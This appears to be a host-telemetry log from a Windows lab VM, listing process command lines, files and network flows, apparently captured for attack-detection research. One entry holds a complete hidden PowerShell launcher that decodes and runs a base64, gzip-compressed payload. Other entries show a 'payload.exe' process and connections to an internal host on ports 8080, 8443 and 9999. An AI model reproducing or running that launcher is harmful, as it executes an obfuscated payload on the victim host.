8daa31fbb6dfc08603094fc71a423c8113047c6eba3cb7c1c056b60ab92558bf,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceAndNoImpersonation'},473600
619a24b16a82e5b909bed145bdd2b59b0f922203581e2aa599a4afa83d04bb2a,"{'subject': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe powershell.exe -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((H4sIAMUL12ICA7VXbY/aR+hD++Xqn/wYqQMAoHNriXu0iRasPxFmxe/HZAUWXstb3H2kvsNRxp+987C/juolzatFIsWax3Z2Znn3lmZ{1}mL1GeYp{1}IeCH/8/JNweaZe5iWCWPGLsF0XKrtsup3WnpcrO6p1hA+CuFJ3uy5NPJyu37/vFFmGUnb+bvQRU/McJRuCUS7WhD8FN0YZuppsHpDPhD+Eyu+NPqEbj1zEjh3Pj5FwpaYBXxtT3+OeNcwdwUys/vZbtba6kteNu0+FR3Kxah+5zhpJGQEi1JvxV4xtaxx0Sqzr2M5rTkDVcnLZ+bDTvNvRAZYG2PdMRiGuRVOMzzcTLEiiw9n4qbOQuJVRhOM+qrQZChPK/WhRXfYLVe/yquLrvPi5ThBDWGKUMZ3Zko22Mf5Y2BlwYEzVG4Bi2TZTiN1rUaiO3pFomVtCCkLvwXM6KBDiV236skvlQCqSnLanWI6ivn1GlQEHTWrL7i6IkJNXie2AAI/sVBDEsGHZetVyj0PFE+q9MKAp/FKc3xSfeDINUFHXb3GM2O8Fmxs{1}LV1k+IC5VACtP691qTS1WuWAQws3IoDtbP+l8QoBJwpX8{1}cxeFOEXdY+ol2C/5Kr4WExQSdMKjUYoZ4J5YvSy{1}oIsIijzGUebU+ErtLsHsSVcrMAlQpvoQ1xy8{1}pDXvnTmHDix+Okx1lA+B252/{1}aiWELEGl9CUzjuXu/BuEqh3i5XldmBaQpn5dMJFHUFAX1DTHlyW1YPQ0rD67qxeEYd/LWWluXfsCzMumHZrmLCt8iCkAYJk75GOPcDzqw{1}AHSDuaOCo3r76KRscjBHIHLO0hGjDDUTAZZ0oGfp5YUWuYiA2THUEJyJyKRo94EZSIS4acqOVFKKi+6maZBmfOc1RKOF44CaE2C+WV1wcEZ{1}wLEEQZm/S8Xvq484EsnQ5e4iGVqrbQj4+SvHMLfHzhBL/ic0M{1}YINHLaKJ5ObpWzjVGfNOc4KkKz2KYEj+0YbbE8PMCrw2t33wUfR5QdP3YHTd3v5NN+70bFh+j{1}3xiqH4wCdG+uC3+MxRWGeqDmZY0pTY1yQLxvaQLYbqwMJStIh9Ik3BhrnIJXwYuLrf1T4fWjnQVFEG95LabiuTtrQF8BZYjrZqYCT48DiGMRTTyV{1}b5po0JHejznzjt+npLlwyaSi8OXZqb14tus9m8Dbz+LyRQNRq0SOE5c2oN/ERrNh09YJY+tG5b9Nv7M+z2m5t9ee+5{1}vzBt5/KBGH3vBbpPM90Fbjywyi3RLLfRuHjl{1}x3iYvRsOopbR2Uaze+2w6Tv3S3c09u5ne8PS2+MHvTXsxGOzNzesziHa9Em2NLXB0jWyzRF0WvFx05LJ+PN+W{1}b0Ko+vLk46i6KZmLdxl7CfbJztqP7p20iRt3jqW3aJd8Jm+PYLDE3zD/R63Y2O5lRSzq8mL1o28aM9z/cGYbezlYtEOZr4pO5PeaLuxRpb90Btb/eXE+dOPHheurdj++x8tmv3nrjh6JQdXumMY9wEQOLCd5yBxTeQdrrhftQm+oAk6dkdKnd3afhk4Sy/Pddf/kF+DoJBHT4pjL9w4D2/aGkaUC7vOpKivTpmO1743rOx881j7N+pF6ByMP3pmqWV4Pb+239015CXsraeq0InUIa7a8pHc7b6Ts+mw7nz2clH6j+BOzfE1c3wuv+nsd476fzY9C/KzaJI6nj/YF5I/BZs5q39oc3kAQrG6es3VpX9qNP2+Yw3iZ9/qhD/RSZ8qwXqXpb+HHoEM{1}d5WFqke+zXqXZjWlmGuIIlx7tihLEYF7A+twkyuxWCaE+75W8qUGbPjdP3svt4cml10Y14Umw9txCy6n375f{1}ItQLnsyNM+UojFtelx7YkQeuTHiXlVBi+/2AdujuKJ2N13jwBl9I2OdkGcz{1}URPFHQwU3JAbF+pt{1}fQs32H{1}LxRVq/bnmcfQ+0SslL7E6HemLBS+AAMRlOveJXozM9wMAV+iRUGL84vLyIVI5q9iMpcyncMfwE/0KZ57l/WP0uGkl1js1Xk19OvOh2P+z0rocZyJnQfA{1}634VeBeGSIi9iC2EB/oeXh/9BmBTsyoAL56n9/Q2hf1fym{1}wAAA{0}{0})-f=,g)))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'}",470888
8bb342e7a1cda2c4065ce7f27e1812b362bb3d686df5fa106acc72f24889fe5f,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 1666846486-779156655-774406944-3116519025536314-10197683971052088329-277897143'},470889
493449387981f542ae99e39f97088186bf62efe820e30bde2fafe79360875fb4,{'file': 'c:/program files/wireshark/tshark.exe'},1919
0395a7c6e956e481154cfba51b07c801fdb74c38b261b4ef32e622e269a870b9,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0xc18'},472459
a3bc39197a1a026e21367da78b9d2635ca5cc5511d7b6c768acd4fa10ffa827f,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0xc18'},472467
36701d8bef3cb5ae5eb35a855e471a939d3bcf75d976e4f7297943ed4aaaebac,{'file': 'c:/windows/system32/mshta.exe'},447383
2fbde5f768353c52a330ff1e27be0c37d02ce85aba0b4fa91f303660fea5fa05,{'netflow': '192.168.223.128:50149->10.193.66.115:8443'},473507
8842911f3bdd65f9fff79175f4e2fdf7f1d01a655bfc9d4ec9b0ddf38b512b46,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k netsvcs'},469923
4cf264d488f7cf35e7454bdca2e19772c578eaf05973bbf04f9e3fd3c3d1343a,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},473508
b37ac080e71c1fe650bc5220683d89f0637a86753c991f78dbfaf6605d546a7b,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k WerSvcGroup'},469928
a298ea4ac54414cae303113c0a14a71272b5af0067f236f5e7ffefbfec56a076,{'subject': 'c:/program files/confer/repux.exe repux.exe'},473513
f3a362dbe12bad0d306f1ddec8f3b8bf8a893871097c2e7109dbe097606d5b01,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe -contentproc --channel=3900.5.951001077/391959572 -greomni C:/Program Files/Mozilla Firefox/omni.ja -appomni C:/Program Files/Mozilla Firefox/browser/omni.ja -appdir C:/Program Files/Mozilla Firefox/browser  3900 /./pipe/gecko-crash-server-pipe.3900 tab'},470953
179f92addc05d8b6f81fdec2cb54ad8ce3b97f14eb48e9f55436983f2850b11b,{'subject': 'c:/windows/system32/services.exe C:/Windows/system32/services.exe'},469929
277838b2bdf3d23c98629fc02b41fb3a0c2b7e5de45281760c0c4f658bc12757,{'subject': 'c:/python27/python.exe python  -m SimpleHTTPServer'},470957
08cabf6b077594bf4baf9766a49d2dafcb4e3f7e879af0486706655afbba6144,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/System32/cmd.exe '},470958
dc5e419f596198cacd0140f50cf7377044dbd035756b25caebacf1c12023f5af,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -1647456713-875421518142973041025147409-1538463883-17554966281843809978-395611313'},470959
f04319755dcf8d05e33d2d6c7a7412848abad97b76839635fc6218cfeda4b453,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -n -i /Device/NPF_{DE145F66-537B-427D-820A-707CC694DA57} -f udp port 53 -Z 4660'},470960
59d721f381c754ef3e28774539d4a6905347da47c0c5b329c6c1000be8f7b5fd,{'subject': 'c:/program files/wireshark/tshark.exe C:/Program Files/Wireshark/tshark  -i 2 -t ad -f udp port 53 '},470961
0817ec915f3aeec7f89f81c56323cbcc1883fa3a1241dc6f59f568b654e27e7d,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 177932576498535421-2113097610153166625491838115-2083859539-6155808142143712326'},470962
6b62666f2d6effe1052b7deebc68e7d2506c7925d05daff1869f2537be16114f,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/system32/cmd.exe /c C:/Users/aalsahee/Desktop/start_dns_logs.bat '},470964
7368fc9d1e74a6d4ed4add864ae5f16a0c084355eb2c4f8b6d65c82bd9e3d458,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -1107079934-510235374-1756141904188279807918412658731467348259839592866666406460'},470965
2f1e302555d8c8a565bf17d70c838005dd350c17ac5dc0fab3842db97461ec13,{'file': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe'},318390
616df077b14e3e4929c04d5f2d05f96fb271d1d6c56d2d3f0913b40a8356ac47,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k swprv'},471481
a8b1ccb871e8dddc3c78ca523e88c5ec92fc4d30e8a76ad5a2237bb747824445,{'file': 'c:/windows/system32/dwm.exe'},124863
4dec786758a4b0107204ef665e9bfcc3f8b1f0acf359b023be9bd174e3ef10e6,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE '},469960
e94411b0ab40904d08aa339e28c0bec184e27acb0f0230ac9f30702e93a1f15c,{'netflow': '192.168.223.128:50103->10.193.66.115:8080'},469961
4ea09ba7a09d60c3d8144379dd21afe651b32651b7a11168089684cec61a168d,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k DcomLaunch'},469962
9f8ac36806665317fa251bf38d3575497d18f7958c6f03cbcf034bfd86eaa556,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},469963
382617861ca4f65a7702b0e8db922337b59d9fffe862d76f535f5d2c48c9f824,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k RPCSS'},469964
841a0ed17d9fc1f6e3fcd11487232d0b6a38052635a09019aea31f2e7a004f40,{'subject': 'c:/program files/vmware/vmware tools/vmtoolsd.exe C:/Program Files/VMware/VMware Tools/vmtoolsd.exe -n vmusr'},473550
471292749f1e931e48bdae5af6a984d138e3bca180b2cc45b1b2159887b04426,{'subject': 'c:/program files/vmware/vmware tools/tpautoconnect.exe TPAutoConnect.exe -q -i vmware -a COM1 -F 30'},473551
7dad7e7d8f2e3e02caac619a5d94e57e11b5c26c624e6c6a598275edc15cea46,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -487645183-1293012984-1168617979-603719737-65541824142213917725269363891621020'},473552
c7c2d16d53d1e2c9a2c573bd98c9e7f3a0f91de7185be49c656df36d1ef69d26,{'subject': 'c:/program files/confer/repux.exe repux.exe'},473553
c35c9aa325e69d48c791dd463a85b484a99c25fa76bb07e68e910f19e2be4269,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE  /Embedding'},469969
3eedc8b87a0e381ef569bc6a88dc95e6a17aab9d5fcf04ce04fc834210649a90,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471000
d82912b91bd2d7854eeece6c3f6967c1e58f3af78f6ddfb8c63de0705e8d0e80,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471001
5aeb243c682f8bd6cc4184aa2f0d5f455849748eb1b6c7c20227f926a1d729df,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0x76c'},471004
8ab27c7399a39e639331aaba11dec411db9d51fc377260454bbe8a908e4b0706,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0x76c'},471005
d36d5388ed0e870dde4f9de0ddeda2aff2fa9ba9af19383556a421629e7abcbc,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471007
466f40367068f7cc8bbe659df89d3c1430485f44bda1d372e017359dc217321b,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},471008
dbdd80ef7817db03e5c54ce02183fe28d527d03bb505c43409477b88d4f45fb1,{'subject': 'c:/windows/system32/consent.exe consent.exe 984 378 02B98B58'},471009
12869b25bc26fb604a47e44d08e416dabdeab915b5cf2136a231428e6633e45b,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},471010
911941f76bc572626acae1a14111540be0264a87828e07a2d6f27fff7b0f7549,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},471011
229f3fea713873317ecee55c9d8e07410885d0b410c73d8160931ca59e45a9cf,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},471012
cbcf279a55c7b874e2ee3efc78f6eadfc27e47cf473e22c51ab0763c1b9f3b90,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},471013
044ed09df5eb296b145828aa48012d7a69ed2024280a4edca7c05f9a5ca93e80,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE '},471014
d9b7019068fe5bda90c03a4c27aa0efc505d87c0113e0e2be4925825bbb50b9a,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k NetworkService'},471017
fb3ffc5aed9aa2b0b0e78a553da6a7941ccd003759ab9431e4a751b9d43351f7,{'netflow': '192.168.223.128:50090->10.193.66.115:8080'},471018
eb9666ccad765c03dc9660eb9e23ad30bfdaf9245001a0eaf32c550aadefee48,{'subject': 'c:/users/aalsahee/payload.exe payload.exe'},473069
e7e43ab71ebc0452c9e1e8bee643f6c115303fb3d8f264c6f7b05331b6d4f81a,{'netflow': '192.168.223.128:50168->10.193.66.115:9999'},473070
93e4a2ca439c76118b5da5db7684c8662695d13a9c10e8a7da5fc5253eb24c7e,{'subject': 'c:/users/aalsahee/payload.exe payload.exe'},473071
97903dd4ee8e59229e4fe7b0ad6804e63e92e291f8d8e1e3695c8d81ebbde580,"{'file': 'HKU/S-1-5-21-450080267-1945256726-3465656282-1000/Software/Classes/Local Settings/MuiCache/36/52C64B7E/@C:/Windows/system32/WindowsPowerShell/v1.0/powershell.exe,-101'}",468981
a333026b409b9f9238413904705c5799a8594167b58686de6a0f79ed7d516c98,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe '},473592
3c8b29461a4fffc1b3d7a637b14c80cad38ce0193205eeb38324c316cb38165b,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe -contentproc --channel=1928.0.1935618673/1508655011 -greomni C:/Program Files/Mozilla Firefox/omni.ja -appomni C:/Program Files/Mozilla Firefox/browser/omni.ja -appdir C:/Program Files/Mozilla Firefox/browser  1928 /./pipe/gecko-crash-server-pipe.1928 tab'},473595
e6cc300fe4dce0f52ba43cd6093c1959330b2e88c837b12209813c6ace6e7043,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/dllhost.exe /Processid:{D2FE8F47-D0BC-443A-B30F-841E8D5063B0}'},473596
